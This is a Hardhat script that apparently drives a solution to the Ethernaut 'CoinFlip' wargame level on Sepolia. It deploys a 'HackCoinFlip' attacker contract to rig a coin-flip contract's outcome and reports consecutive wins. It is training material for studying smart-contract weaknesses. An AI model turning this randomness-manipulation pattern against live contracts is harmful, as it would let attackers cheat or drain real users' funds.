import { ethers, network } from "hardhat";
import * as dotenv from 'dotenv';
import { Contract } from "ethers";

dotenv.config();

// Set the number of time you want to flip the coin
const DESIRED_WINS = 10;

async function main() {
    // We only verify on Sepolia!
    if (network.config.chainId != 11155111) {
      console.log("Ethernaut contracts in this repo can only be run on the Sepolia Network");
      
    } else {
        // Initialize variables needed to access the coin flip contract
        // const address: string = process.env.GOERLI_PRIVATE_KEY ? process.env.GOERLI_PRIVATE_KEY : '';
        // const signer: Signer = await .getSigner(address);
        // console.log(`Signer: ${await signer.getAddress()}`)
        const contractAddress: string = process.env.CONTRACT_INSTANCE_ADDRESS ? process.env.CONTRACT_INSTANCE_ADDRESS : ethers.constants.AddressZero;
        const contract: Contract = await ethers.getContractAt('CoinFlip', contractAddress);

        console.log("Contract Instance Loaded")
        
        // Deploy the hack coin flip contract with a guess goal of 10
        const exploitFactory = await ethers.getContractFactory("HackCoinFlip");
        const exploitFlipContract = await exploitFactory.deploy(contractAddress);

        // Set consecutive wins to 0
        let wins = await contract.consecutiveWins();

        if (wins < DESIRED_WINS) {
            const transactionResponse = await exploitFlipContract.guaranteeGuess();
            transactionResponse.wait(2);
            wins = await contract.consecutiveWins();
            console.log(`Consecutive Wins: ${wins}`);
        }

        if (wins == 0) {
            console.log('Attack Failed');
        }

        (wins == DESIRED_WINS) ? console.log("Attacked Successful") : console.log(`${DESIRED_WINS - wins} flips needed`);
    }
  }
  
  // We recommend this pattern to be able to use async/await everywhere
  // and properly handle errors.
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error)
      process.exit(1)
    })